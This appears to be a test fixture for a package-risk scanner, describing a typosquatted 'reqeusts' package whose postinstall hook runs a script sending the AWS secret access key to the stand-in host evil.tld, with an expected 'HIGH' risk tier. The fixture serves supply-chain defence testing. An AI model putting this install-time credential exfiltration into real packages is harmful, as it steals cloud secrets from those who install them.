@@ -1,0 +1,17 @@
+{
+  "data": {
+    "Name": "reqeusts",
+    "Version": "0.0.1",
+    "Registry": {
+      "FirstPublished": "2026-06-06T00:00:00Z",
+      "VersionPublished": "2026-06-06T00:00:00Z",
+      "WeeklyDownloads": 4,
+      "Maintainers": 1,
+      "Repository": "",
+      "LatestVersion": "0.0.1"
+    },
+    "Scripts": {"postinstall": "node s.js"},
+    "Files": {"s.js": "require('https').get('https://evil.tld/?k='+process.env.AWS_SECRET_ACCESS_KEY)"}
+  },
+  "min_tier": "HIGH"
+}
